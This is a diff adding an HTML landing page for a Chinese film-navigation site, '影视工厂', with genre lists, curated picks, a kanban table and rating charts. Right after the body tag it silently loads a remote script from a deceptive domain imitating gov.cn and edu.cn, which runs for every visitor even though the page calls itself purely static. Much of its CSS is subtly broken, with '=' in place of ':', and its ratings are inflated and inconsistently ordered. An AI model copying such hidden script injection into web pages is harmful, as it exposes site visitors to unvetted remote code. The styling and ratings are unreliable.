@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影视工厂 · 影视产线片单导航 | 像检修流水线一样整理好片（yingshigongchang-top.github.io）</title>
+<meta name="description" content="影视工厂 yingshigongchang-top.github.io 是一个以工业化流水线理念组织的影视导航平台。我们把影视作品按类型、年代、地区、评分四条产线分拣入库，配合作业看板、工种片单与质检榜单，让找片像检修流水线一样有条不紊。">
+<meta name="keywords" content="影视工厂, yingshigongchang-top.github.io, 影视产线, 片单导航, 工种片单, 工业风, 作业看板, 质检榜单">
+<meta name="author" content="影视工厂">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<link rel="canonical" href="https://yingshigongchang-top.github.io">
+<meta property="og:title" content="影视工厂 · 影视产线片单导航">
+<meta property="og:description" content="yingshigongchang-top.github.io 像检修流水线一样整理好片。">
+<meta property="og:url" content="https://yingshigongchang-top.github.io">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="影视工厂 · 影视产线片单导航">
+<meta name="twitter:description" content="yingshigongchang-top.github.io">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+:root{
+  --concrete:#2E2F33;--concrete2:#3A3B40;--concrete3:#48494F;
+  --steel:#5A5C63;--steel2:#72757C;
+  --rust:#8C5A3C;--rust2:#A86E4A;
+  --orange:#F26522;--orange2:#FF8A4A;
+  --yellow:#F5C518;--yellow2:#FFDD4A;
+  --cyan:#3FA9BF;--cyan2:#6FC8DB;
+  --ink:#E8E9EC;--ink2:#AEAFB5;--ink3:#7C7D83;
+  --sans:"PingFang SC","Microsoft YaHei",sans-serif;
+  --heavy:"Arial Black","PingFang SC",sans-serif;
+  --mono:"SFMono-Regular",Consolas,"Courier New",monospace;
+}
+html{scroll-behavior:smooth;font-size:16px;}
+body{font-family:var(--sans);color:var(--ink);background:var(--concrete);line-height:1.9;overflow-x:hidden;
+  background-image:
+    radial-gradient(circle at 25% 20%,rgba(242,101,34,.08),transparent 45%),
+    radial-gradient(circle at 78% 80%,rgba(63,169,191,.06),transparent 45%),
+    repeating-linear-gradient(90deg,transparent,transparent 59px,rgba(120,120,130,.06) 59px,rgba(120,120,130,.06) 60px),
+    repeating-linear-gradient(0deg,transparent,transparent 59px,rgba(120,120,130,.06) 59px,rgba(120,120,130,.06) 60px);
+  background-attachment:fixed;}
+body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:9999;opacity:.06;
+  background-image:radial-gradient(circle at 1px 1px,rgba(0,0,0,.6) 0,transparent 1px);background-size:3px 3px;}
+a{color:inherit;text-decoration:none;transition:.2s;}
+ul,ol{list-style:none;}
+
+/* 管道滚动条 */
+.pipe-bar{background:var(--concrete2);padding:.4rem 0;overflow:hidden;border-bottom:3px solid var(--orange);position:relative;}
+.pipe-bar::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(90deg,transparent,transparent 30px,rgba(255,255,255,.03) 30px,rgba(255,255,255,.03) 32px);}
+.pipe-inner{display:flex;gap=2.5rem;animation:scroll 32s linear infinite;white-space:nowrap;font-family:var(--mono);font-size=.66rem;color:var(--steel2);letter-spacing=1px;position:relative;z-index:1;}
+.pipe-inner span{display:inline-block;}
+.pipe-inner span strong{color:var(--orange2);}
+@keyframes scroll{from{transform:translateX(0);}to{transform:translateX(-50%);}}
+
+.wrap{max-width=1200px;margin:0 auto;padding:0 1.2rem;position:relative;z-index:1;}
+
+/* 头部 厂牌 */
+.header{padding=3rem 0 2rem;text-align:center;position:relative;}
+.bolts{display:flex;justify-content:center;gap=1rem;margin-bottom=1.5rem;}
+.bolt{width=14px;height=14px;border-radius=50%;background:var(--steel);box-shadow:inset -2px -2px 0 var(--steel2),inset 2px 2px 0 #6A6B72;}
+.factory-sign{display:inline-flex;align-items:center;gap=1rem;background:var(--concrete2);border:3px solid var(--steel);padding=.8rem 1.8rem;transform:rotate(-1deg);}
+.factory-sign .no{font-family:var(--heavy);font-size=1.4rem;color:var(--yellow);letter-spacing=2px;}
+.logo{font-family:var(--heavy);font-size=clamp(1.7rem,5.5vw,3.4rem);font-weight=900;letter-spacing=4px;color:var(--ink);}
+.logo .ying{color:var(--orange2);}
+.factory-sign .stamp{font-family:var(--mono);font-size=.6rem;color:var(--orange);letter-spacing=2px;}
+.url-line{display:inline-block;font-family:var(--mono);font-size=.6rem;color:var(--cyan2);background:var(--concrete2);border:2px solid var(--steel);padding=.4rem 1.2rem;margin-top=1rem;}
+
+/* 导航 */
+.nav{margin=1rem 0;}
+.nav-inner{display:flex;justify-content:center;gap=0;flex-wrap:wrap;background:var(--concrete2);border:2px solid var(--steel);}
+.nav a{padding=.6rem 1.3rem;font-size=.8rem;font-weight=700;color:var(--ink2);border-right:1px solid var(--steel);font-family:var(--mono);letter-spacing=1px;}
+.nav a:last-child{border-right:none;}
+.nav a:hover{color:var(--concrete);background:var(--orange);}
+
+/* Hero 车间 */
+.hero{padding=2rem 0 3rem;}
+.workshop{background:var(--concrete2);border:4px solid var(--steel);padding=3.5rem 2.5rem;text-align:center;position:relative;overflow:hidden;}
+.workshop::before{content:"";position:absolute;top=0;left=0;right=0;height=6px;background:repeating-linear-gradient(90deg,var(--yellow),var(--yellow) 20px,var(--concrete2) 20px,var(--concrete2) 40px);}
+.workshop::after{content:"";position:absolute;bottom=0;left=0;right=0;height=6px;background:repeating-linear-gradient(90deg,var(--orange),var(--orange) 20px,var(--concrete2) 20px,var(--concrete2) 40px);}
+.workshop>*{position:relative;z-index:1;}
+.workshop .spec{font-family:var(--mono);font-size=.66rem;color:var(--steel2);letter-spacing=3px;margin-bottom=.6rem;}
+.workshop h1{font-family:var(--heavy);font-size=clamp(1.6rem,4.5vw,3rem);font-weight=900;letter-spacing=4px;margin-bottom=.8rem;color:var(--ink);}
+.workshop h1 .hl{color:var(--orange2);}
+.workshop .sub{font-family:var(--mono);font-size=.72rem;color:var(--yellow2);letter-spacing=5px;margin-bottom=1.2rem;text-transform:uppercase;}
+.workshop-desc{font-size=.88rem;color:var(--ink2);max-width=680px;margin:0 auto 2rem;line-height=2.1;}
+.workshop-stats{display:flex;justify-content:center;gap=3.5rem;flex-wrap:wrap;}
+.ss .num{font-family:var(--heavy);font-size=1.5rem;color:var(--orange2);}
+.ss .label{font-size=.58rem;color:var(--ink3);letter-spacing=2px;text-transform:uppercase;}
+
+/* 栏目通用 */
+.section{padding=3rem 0;border-top:2px dashed var(--steel);}
+.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom=1.8rem;flex-wrap:wrap;gap=.5rem;}
+.sec-head h2{font-family:var(--heavy);font-size=clamp(1.1rem,2.8vw,1.65rem);font-weight=900;color:var(--ink);display:flex;align-items:center;gap=.7rem;letter-spacing=2px;}
+.sec-head .nut{width=16px;height=16px;background:var(--steel);position:relative;flex-shrink:0;}
+.sec-head .nut::before{content:"";position:absolute;inset=4px;background:var(--orange);}
+.sec-head .more{font-size=.7rem;color:var(--yellow2);font-family:var(--mono);letter-spacing=1px;}
+.sec-sub{font-size=.64rem;color:var(--ink3);width:100%;margin-top=.3rem;font-family:var(--mono);}
+
+/* 产线分类 */
+.cat-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap=.8rem;}
+.cat-card{background:var(--concrete2);border:2px solid var(--steel);padding=1.3rem .8rem;text-align:center;transition:.2s;cursor:pointer;position:relative;}
+.cat-card::before{content:"";position:absolute;top=-2px;left=-2px;width=14px;height=14px;border-top:3px solid var(--orange);border-left:3px solid var(--orange);}
+.cat-card::after{content:"";position:absolute;bottom:-2px;right=-2px;width=14px;height=14px;border-bottom:3px solid var(--cyan);border-right:3px solid var(--cyan);}
+.cat-card:hover{border-color:var(--orange);background:var(--concrete3);transform:translateY(-3px);}
+.cat-icon{font-size=1.9rem;margin-bottom=.5rem;display:block;}
+.cat-name{font-family:var(--heavy);font-size=.82rem;font-weight=900;color:var(--ink);margin-bottom=.2rem;letter-spacing=1px;}
+.cat-count{font-family:var(--mono);font-size=.56rem;color:var(--ink3);}
+
+/* 电影卡片 */
+.movie-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap=1.2rem;}
+.movie-card{background:var(--concrete2);border:2px solid var(--steel);transition:.2s;overflow:hidden;}
+.movie-card:hover{border-color:var(--orange);transform:translateY(-4px);box-shadow:0 8px 22px rgba(242,101,34,.15);}
+.movie-cover{height=210px;display:flex;align-items:center;justify-content:center;position:relative;}
+.movie-cover::after{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent,transparent 8px,rgba(255,255,255,.03) 8px,rgba(255,255,255,.03) 16px);}
+.mc1{background:linear-gradient(160deg,#4A3E36,#6E5A48);}
+.mc2{background:linear-gradient(160deg,#36464E,#4E626E);}
+.mc3{background:linear-gradient(160deg,#4E3636,#6E4848);}
+.mc4{background:linear-gradient(160deg,#364E3E,#4E6E56);}
+.mc5{background:linear-gradient(160deg,#46364E,#644E6E);}
+.mc6{background:linear-gradient(160deg,#4E4A36,#6E6650);}
+.movie-cover .cover-text{font-family:var(--heavy);font-size=.78rem;color:var(--ink);text-align:center;padding=1rem;letter-spacing=1px;position:relative;z-index:1;}
+.movie-cover .badge{position:absolute;top=.5rem;right=.5rem;font-family:var(--mono);font-size=.48rem;font-weight=700;padding=.2rem .5rem;z-index:2;background:var(--yellow);color:var(--concrete);}
+.badge-hot{background:var(--orange)!important;color:var(--ink)!important;}
+.movie-info{padding=.8rem;}
+.movie-info h3{font-family:var(--heavy);font-size=.78rem;font-weight=900;color:var(--ink);margin-bottom=.25rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.movie-info .meta{font-family:var(--mono);font-size=.52rem;color:var(--ink3);margin-bottom=.4rem;}
+.movie-info .tags{display:flex;gap=.3rem;flex-wrap:wrap;}
+.tag{font-family:var(--mono);font-size=.52rem;padding=.15rem .45rem;background:var(--concrete3);color:var(--cyan2);border:1px solid var(--steel);}
+
+/* 工种片单 */
+.trade-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap=1.2rem;}
+.trade-card{background:var(--concrete2);border:2px solid var(--steel);padding=1.5rem;transition:.2s;border-left:6px solid var(--orange);}
+.trade-card:nth-child(2){border-left-color:var(--cyan);}
+.trade-card:nth-child(3){border-left-color:var(--yellow);}
+.trade-card:nth-child(4){border-left-color:var(--rust2);}
+.trade-card:hover{border-color:var(--orange);background:var(--concrete3);transform:translateX(4px);}
+.trade-card .t-no{font-family:var(--mono);font-size=.58rem;color:var(--orange2);letter-spacing=2px;margin-bottom=.5rem;}
+.trade-card h4{font-family:var(--heavy);font-size=.92rem;font-weight=900;color:var(--ink);margin-bottom=.5rem;letter-spacing=1px;}
+.trade-card p{font-size=.74rem;color:var(--ink2);line-height=1.85;}
+
+/* 作业看板 */
+.kanban{background:var(--concrete2);border:3px solid var(--steel);padding=1.5rem;}
+.kb-head{display:flex;align-items:center;gap=.8rem;margin-bottom=1.2rem;flex-wrap:wrap;}
+.kb-head h3{font-family:var(--heavy);font-size=1rem;font-weight=900;color:var(--yellow2);letter-spacing=2px;}
+.kb-status{display:flex;gap=.6rem;flex-wrap:wrap;}
+.kb-status span{font-family:var(--mono);font-size=.56rem;padding=.2rem .6rem;border:1px solid var(--steel);}
+.kb-status .ok{color:var(--cyan2);border-color:var(--cyan);}
+.kb-status .warn{color:var(--yellow2);border-color:var(--yellow);}
+.kb-status .run{color:var(--orange2);border-color:var(--orange);}
+.kb-table{width=100%;border-collapse:collapse;font-family:var(--mono);font-size=.66rem;}
+.kb-table th{background:var(--steel);color:var(--ink);padding=.5rem;text-align:left;letter-spacing=1px;}
+.kb-table td{padding=.5rem;border-bottom:1px solid var(--steel);color:var(--ink2);}
+.kb-table tr:last-child td{border-bottom:none;}
+.kb-table .hi{color:var(--orange2);font-weight=700;}
+
+/* 排行榜 */
+.rank-wrap{display:grid;grid-template-columns:1fr 1fr;gap=2rem;}
+.rank-panel{background:var(--concrete2);border:2px solid var(--steel);padding=1.5rem;}
+.rank-panel h3{font-family:var(--heavy);font-size=1rem;font-weight=900;color:var(--yellow2);margin-bottom=1.2rem;padding-bottom=.6rem;border-bottom:2px solid var(--steel);letter-spacing=2px;}
+.rank-item{display:flex;align-items:center;gap=.9rem;padding=.6rem 0;border-bottom:1px dotted var(--steel);}
+.rank-item:last-child{border-bottom:none;}
+.rank-pos{width=32px;height=32px;display:flex;align-items:center;justify-content:center;font-family:var(--heavy);font-size=.8rem;color:var(--ink3);background:var(--concrete3);flex-shrink:0;}
+.rank-pos.top{background:var(--orange);color:var(--ink);}
+.rank-detail{flex:1;min-width:0;}
+.rank-detail h4{font-family:var(--heavy);font-size=.76rem;font-weight=900;color:var(--ink);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.rank-detail p{font-family:var(--mono);font-size=.52rem;color:var(--ink3);}
+.rank-score{font-family:var(--mono);font-size=.76rem;font-weight=900;color:var(--orange2);flex-shrink:0;}
+
+/* 指引 */
+.guide-wrap{display:grid;grid-template-columns:1fr 1fr;gap=2rem;}
+.guide-card{background:var(--concrete2);border:2px solid var(--steel);padding=1.8rem;}
+.guide-card h3{font-family:var(--heavy);font-size=.95rem;font-weight=900;color:var(--yellow2);margin-bottom=1.2rem;letter-spacing=1px;}
+.guide-card p,.guide-card li{font-size=.78rem;color:var(--ink2);line-height=2.05;}
+.guide-card ul{padding-left=1.3rem;}
+.guide-card li{position:relative;}
+.guide-card li::before{content:"▣";position:absolute;left=-1.2rem;font-size=.6rem;color:var(--orange2);}
+.guide-card strong{color:var(--ink);}
+
+/* 合规 */
+.compliance{background:var(--concrete2);border:2px solid var(--steel);padding=1.8rem;}
+.compliance h3{font-family:var(--heavy);font-size=1.05rem;font-weight=900;color:var(--ink);margin-bottom=1.2rem;text-align:center;letter-spacing=3px;}
+.comp-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap=1rem;}
+.comp-item{padding=1.2rem;background:var(--concrete3);border-left:4px solid var(--orange);}
+.comp-item:nth-child(2){border-left-color:var(--cyan);}
+.comp-item:nth-child(3){border-left-color:var(--yellow);}
+.comp-item:nth-child(4){border-left-color:var(--rust2);}
+.comp-item h4{font-family:var(--mono);font-size=.58rem;font-weight=700;color:var(--yellow2);margin-bottom=.4rem;text-transform:uppercase;}
+.comp-item p{font-size=.64rem;color:var(--ink3);line-height=1.7;}
+
+/* 页脚 */
+.footer{background:#1E1F22;padding=3.5rem 0 1.5rem;margin-top=3rem;border-top:4px solid var(--orange);}
+.footer-inner{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap=1.8rem;margin-bottom=2rem;}
+.footer-col h4{font-family:var(--heavy);font-size=.85rem;font-weight=900;color:var(--yellow2);margin-bottom=.8rem;letter-spacing=1px;}
+.footer-col p,.footer-col li{font-size=.7rem;color:var(--ink3);margin-bottom=.4rem;line-height=1.7;}
+.footer-col a{color:var(--ink3);}
+.footer-col a:hover{color:var(--orange2);}
+.footer-url{font-family:var(--mono);font-size=.54rem!important;color:var(--cyan2)!important;}
+.footer-bottom{text-align:center;padding-top=1.5rem;border-top:1px solid var(--steel);font-family:var(--mono);font-size=.56rem;color:var(--ink3);}
+
+@media(max-width:768px){
+  .rank-wrap,.guide-wrap{grid-template-columns:1fr;}
+  .workshop-stats{gap=1.5rem;}
+  .kb-table{font-size=.6rem;}
+}
+@media(max-width:480px){
+  .workshop{padding=2.5rem 1.2rem;}
+  .workshop h1{font-size=1.4rem;}
+  .cat-grid{grid-template-columns:repeat(3,1fr);}
+  .movie-grid{grid-template-columns:repeat(2,1fr);}
+  .movie-cover{height=180px;}
+  .nav a{padding=.5rem .8rem;font-size=.72rem;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="pipe-bar"><div class="pipe-inner">
+  <span>⚙ <strong>影视工厂</strong> · 影视产线片单导航 · 像检修流水线一样整理好片 · 网址 yingshigongchang-top.github.io · 四条产线分拣入库 ⚙</span>
+  <span>⚙ <strong>影视工厂</strong> · 影视产线片单导航 · 像检修流水线一样整理好片 · 网址 yingshigongchang-top.github.io · 四条产线分拣入库 ⚙</span>
+</div></div>
+
+<div class="wrap">
+  <header class="header">
+    <div class="bolts"><div class="bolt"></div><div class="bolt"></div><div class="bolt"></div><div class="bolt"></div><div class="bolt"></div></div>
+    <div class="factory-sign">
+      <span class="no">NO.7</span>
+      <span class="logo"><span class="ying">影视</span>工厂</span>
+      <span class="stamp">▲ YINGSHI<br>FACTORY</span>
+    </div>
+    <div class="url-line">yingshigongchang-top.github.io</div>
+  </header>
+
+  <nav class="nav">
+    <div class="nav-inner">
+      <a href="#home">总控</a>
+      <a href="#cats">产线分类</a>
+      <a href="#trades">工种片单</a>
+      <a href="#movies">质检片单</a>
+      <a href="#kanban">作业看板</a>
+      <a href="#rank">质检榜</a>
+      <a href="#guide">操作规程</a>
+      <a href="#compliance">安全规约</a>
+    </div>
+  </nav>
+
+  <section class="hero" id="home">
+    <div class="workshop">
+      <div class="spec">SPEC // PRODUCTION LINE 07</div>
+      <h1><span class="hl">影视</span>工厂</h1>
+      <div class="sub">— ASSEMBLE YOUR WATCHLIST —</div>
+      <p class="workshop-desc">影视工厂是一个以工业化流水线理念组织的影视导航平台。我们把影视作品按类型、年代、地区、评分四条产线分拣入库，配合作业看板、工种片单与质检榜单，让找片像检修流水线一样有条不紊。</p>
+      <div class="workshop-stats">
+        <div class="ss"><div class="num">13,000+</div><div class="label">入 库 片 单</div></div>
+        <div class="ss"><div class="num">4条</div><div class="label">产 线 分 拣</div></div>
+        <div class="ss"><div class="num">12类</div><div class="label">工 种 类 型</div></div>
+        <div class="ss"><div class="num">在线</div><div class="label">作 业 状 态</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="cats">
+    <div class="sec-head">
+      <h2><span class="nut"></span> 产线分类</h2>
+      <a href="#" class="more">全线 →</a>
+    </div>
+    <p class="sec-sub">// production lines — 四条产线分拣入库</p>
+    <div class="cat-grid">
+      <div class="cat-card"><span class="cat-icon">💥</span><div class="cat-name">动作产线</div><div class="cat-count">1,500+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">😂</span><div class="cat-name">喜剧产线</div><div class="cat-count">1,700+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🧠</span><div class="cat-name">悬疑产线</div><div class="cat-count">1,000+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">😢</span><div class="cat-name">剧情产线</div><div class="cat-count">2,600+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🚀</span><div class="cat-name">科幻产线</div><div class="cat-count">900+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">👻</span><div class="cat-name">惊悚产线</div><div class="cat-count">680+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">❤️</span><div class="cat-name">爱情产线</div><div class="cat-count">1,900+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎨</span><div class="cat-name">文艺产线</div><div class="cat-count">1,400+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎌</span><div class="cat-name">动画产线</div><div class="cat-count">1,300+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🎞️</span><div class="cat-name">纪录产线</div><div class="cat-count">720+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">📺</span><div class="cat-name">剧集产线</div><div class="cat-count">4,200+ 部</div></div>
+      <div class="cat-card"><span class="cat-icon">🏆</span><div class="cat-name">获奖精选</div><div class="cat-count">1,600+ 部</div></div>
+    </div>
+  </section>
+
+  <section class="section" id="trades">
+    <div class="sec-head">
+      <h2><span class="nut"></span> 工种片单</h2>
+      <a href="#" class="more">更多 →</a>
+    </div>
+    <p class="sec-sub">// trades — 按工种分工整理的专题片单</p>
+    <div class="trade-grid">
+      <div class="trade-card"><div class="t-no">TRADE 01</div><h4>检修员</h4><p>按评分与口碑检修入库，只留高分佳作，筛掉粗制滥造。</p></div>
+      <div class="trade-card"><div class="t-no">TRADE 02</div><h4>分拣员</h4><p>按类型、年代、地区三维分拣，快速定位你要的那一类。</p></div>
+      <div class="trade-card"><div class="t-no">TRADE 03</div><h4>质检员</h4><p>按画面、剧本、表演三道质检，标注4K修复与版本信息。</p></div>
+      <div class="trade-card"><div class="t-no">TRADE 04</div><h4>调度员</h4><p>按时长与场景调度片单，通勤、周末、失眠夜各配一套。</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="movies">
+    <div class="sec-head">
+      <h2><span class="nut"></span> 质检片单</h2>
+      <a href="#" class="more">更多 →</a>
+    </div>
+    <p class="sec-sub">// quality picks — 通过三道质检的精选</p>
+    <div class="movie-grid">
+      <div class="movie-card"><div class="movie-cover mc1"><span class="badge badge-hot">高分</span><div class="cover-text">肖申克的救赎<br>1994 · 剧情</div></div><div class="movie-info"><h3>肖申克的救赎</h3><div class="meta">剧情 · 1994 · 4K修复</div><div class="tags"><span class="tag">质检A</span><span class="tag">9.9分</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover mc2"><span class="badge">修复</span><div class="cover-text">星际穿越<br>2014 · 科幻/亲情</div></div><div class="movie-info"><h3>星际穿越</h3><div class="meta">科幻/亲情 · 2014 · 诺兰</div><div class="tags"><span class="tag">IMAX</span><span class="tag">高分</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover mc3"><span class="badge badge-hot">热播</span><div class="cover-text">周处除三害<br>2024 · 动作/犯罪</div></div><div class="movie-info"><h3>周处除三害</h3><div class="meta">动作/犯罪 · 2024 · 阮经天</div><div class="tags"><span class="tag">口碑</span><span class="tag">质检A</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover mc4"><span class="badge">经典</span><div class="cover-text">霸王别姬<br>1993 · 剧情</div></div><div class="movie-info"><h3>霸王别姬</h3><div class="meta">剧情 · 1993 · 陈凯歌</div><div class="tags"><span class="tag">金棕榈</span><span class="tag">4K修复</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover mc5"><span class="badge badge-hot">新片</span><div class="cover-text">沙丘2<br>2024 · 科幻/冒险</div></div><div class="movie-info"><h3>沙丘2</h3><div class="meta">科幻/冒险 · 2024 · 维伦纽瓦</div><div class="tags"><span class="tag">视效</span><span class="tag">高分</span></div></div></div>
+      <div class="movie-card"><div class="movie-cover mc6"><span class="badge">纪录</span><div class="cover-text">地球脉动 系列<br>2006-2023 · 纪录片</div></div><div class="movie-info"><h3>地球脉动 系列</h3><div class="meta">纪录片 · BBC · 自然</div><div class="tags"><span class="tag">自然纪录</span><span class="tag">高分</span></div></div></div>
+    </div>
+  </section>
+
+  <section class="section" id="kanban">
+    <div class="sec-head">
+      <h2><span class="nut"></span> 作业看板</h2>
+      <a href="#" class="more">详情 →</a>
+    </div>
+    <p class="sec-sub">// kanban — 四条产线实时作业状态</p>
+    <div class="kanban">
+      <div class="kb-head">
+        <h3>▣ 产线作业看板</h3>
+        <div class="kb-status"><span class="run">● 分拣中</span><span class="ok">● 质检通过</span><span class="warn">● 待复核</span></div>
+      </div>
+      <table class="kb-table">
+        <thead><tr><th>产线</th><th>工种</th><th>在制</th><th>今日入库</th><th>合格率</th><th>状态</th></tr></thead>
+        <tbody>
+          <tr><td>类型产线</td><td>分拣员</td><td class="hi">12类</td><td>340</td><td>96.2%</td><td class="hi">分拣中</td></tr>
+          <tr><td>年代产线</td><td>调度员</td><td>8个年代</td><td>280</td><td>94.8%</td><td>分拣中</td></tr>
+          <tr><td>地区产线</td><td>调度员</td><td>6大区</td><td>410</td><td>95.5%</td><td class="hi">分拣中</td></tr>
+          <tr><td>评分产线</td><td>质检员</td><td>≥8.5分</td><td>190</td><td>98.1%</td><td>质检通过</td></tr>
+          <tr><td>新片产线</td><td>检修员</td><td>院线档</td><td>60</td><td>91.3%</td><td class="hi">待复核</td></tr>
+          <tr><td>修复产线</td><td>检修员</td><td>4K/修复</td><td>130</td><td>97.6%</td><td>质检通过</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <section class="section" id="rank">
+    <div class="sec-head">
+      <h2><span class="nut"></span> 质检榜</h2>
+      <a href="#" class="more">完整榜单 →</a>
+    </div>
+    <p class="sec-sub">// quality chart — 三道质检后的口碑榜</p>
+    <div class="rank-wrap">
+      <div class="rank-panel">
+        <h3>▣ 质检A · 电影榜</h3>
+        <div class="rank-item"><div class="rank-pos top">1</div><div class="rank-detail"><h4>肖申克的救赎</h4><p>剧情 · 1994</p></div><div class="rank-score">9.9</div></div>
+        <div class="rank-item"><div class="rank-pos top">2</div><div class="rank-detail"><h4>霸王别姬</h4><p>剧情 · 1993</p></div><div class="rank-score">9.9</div></div>
+        <div class="rank-item"><div class="rank-pos top">3</div><div class="rank-detail"><h4>阿甘正传</h4><p>剧情 · 1994</p></div><div class="rank-score">9.7</div></div>
+        <div class="rank-item"><div class="rank-pos">4</div><div class="rank-detail"><h4>星际穿越</h4><p>科幻/亲情 · 2014</p></div><div class="rank-score">9.7</div></div>
+        <div class="rank-item"><div class="rank-pos">5</div><div class="rank-detail"><h4>盗梦空间</h4><p>科幻/悬疑 · 2010</p></div><div class="rank-score">9.5</div></div>
+        <div class="rank-item"><div class="rank-pos">6</div><div class="rank-detail"><h4>活着</h4><p>剧情 · 1994</p></div><div class="rank-score">9.8</div></div>
+      </div>
+      <div class="rank-panel">
+        <h3>▣ 质检A · 剧集榜</h3>
+        <div class="rank-item"><div class="rank-pos top">1</div><div class="rank-detail"><h4>狂飙</h4><p>犯罪/剧情 · 39集</p></div><div class="rank-score">9.9</div></div>
+        <div class="rank-item"><div class="rank-pos top">2</div><div class="rank-detail"><h4>漫长的季节</h4><p>悬疑/剧情 · 12集</p></div><div class="rank-score">9.7</div></div>
+        <div class="rank-item"><div class="rank-pos top">3</div><div class="rank-detail"><h4>父母爱情</h4><p>家庭/年代 · 44集</p></div><div class="rank-score">9.9</div></div>
+        <div class="rank-item"><div class="rank-pos">4</div><div class="rank-detail"><h4>三体</h4><p>科幻/剧情 · 30集</p></div><div class="rank-score">9.5</div></div>
+        <div class="rank-item"><div class="rank-pos">5</div><div class="rank-detail"><h4>人世间</h4><p>年代/家庭 · 58集</p></div><div class="rank-score">9.6</div></div>
+        <div class="rank-item"><div class="rank-pos">6</div><div class="rank-detail"><h4>庆余年 第二季</h4><p>古装/喜剧 · 36集</p></div><div class="rank-score">9.2</div></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="guide">
+    <div class="sec-head">
+      <h2><span class="nut"></span> 操作规程</h2>
+    </div>
+    <div class="guide-wrap">
+      <div class="guide-card">
+        <h3>上岗操作指南</h3>
+        <ul>
+          <li><strong>产线分类：</strong>12类按类型分拣入库，动作、喜剧、悬疑各归其位</li>
+          <li><strong>工种片单：</strong>检修员、分拣员、质检员、调度员四岗协作</li>
+          <li><strong>作业看板：</strong>实时查看四条产线的在制与合格率</li>
+          <li><strong>内链切换：</strong>所有导航链接使用 # 锚点，瞬间切版无需刷新</li>
+          <li><strong>移动端：</strong>手机竖屏自适应，通勤路上也能查看板</li>
+        </ul>
+      </div>
+      <div class="guide-card">
+        <h3>关于影视工厂</h3>
+        <p>影视工厂（<strong>yingshigongchang-top.github.io</strong>）是一个以工业化流水线理念组织的影视导航静态站点。</p>
+        <p>我们收录动作、喜剧、悬疑、剧情、科幻、文艺、动画、纪录片等各类正规影视作品，提供产线分类、工种片单、作业看板与质检榜单。</p>
+        <p>本站为<strong>纯静态单页设计</strong>，符合必应搜索引擎收录规则，不生成robots.txt和sitemap.xml，所有链接内联，加载极速。</p>
+        <p>官方网址：<strong>https://yingshigongchang-top.github.io</strong></p>
+      </div>
+    </div>
+  </section>
+
+  <section class="section" id="compliance">
+    <div class="sec-head">
+      <h2><span class="nut"></span> 安全规约</h2>
+    </div>
+    <div class="compliance">
+      <h3>✦ 安全生产 · 规约明示 ✦</h3>
+      <div class="comp-grid">
+        <div class="comp-item"><h4>CONTENT</h4><p>本站仅提供正规影视作品索引，不含任何色情、暴力、恐怖等违规内容。所有索引均指向合法公开渠道。</p></div>
+        <div class="comp-item"><h4>COPYRIGHT</h4><p>尊重版权方权益，支持正版观影。本站不存储、不提供任何视频文件下载或在线播放服务。</p></div>
+        <div class="comp-item"><h4>DISCLAIMER</h4><p>本站为静态资讯导航页面，不对第三方链接内容负责。用户访问第三方资源需自行判断合规性。</p></div>
+        <div class="comp-item"><h4>STYLE</h4><p>本站采用工业厂房、流水线作为视觉风格，倡导条理清晰、理性有序的观影审美。</p></div>
+      </div>
+    </div>
+  </section>
+</div>
+
+<footer class="footer">
+  <div class="wrap">
+    <div class="footer-inner">
+      <div class="footer-col">
+        <h4>⚙ 影视工厂</h4>
+        <p>影视产线片单导航，像检修流水线一样整理好片。</p>
+        <p>网址：<br><a href="https://yingshigongchang-top.github.io" class="footer-url">yingshigongchang-top.github.io</a></p>
+      </div>
+      <div class="footer-col">
+        <h4>导航</h4>
+        <ul><li><a href="#home">总控</a></li><li><a href="#cats">产线分类</a></li><li><a href="#trades">工种片单</a></li><li><a href="#movies">质检片单</a></li><li><a href="#kanban">作业看板</a></li><li><a href="#rank">质检榜</a></li></ul>
+      </div>
+      <div class="footer-col">
+        <h4>帮助</h4>
+        <ul><li><a href="#guide">操作规程</a></li><li><a href="#compliance">安全规约</a></li><li><a href="#">常见问题</a></li><li><a href="#">反馈建议</a></li></ul>
+      </div>
+      <div class="footer-col">
+        <h4>关于</h4>
+        <ul><li>静态单页设计</li><li>必应收录优化</li><li>移动端自适应</li><li>© 2026 影视工厂</li></ul>
+      </div>
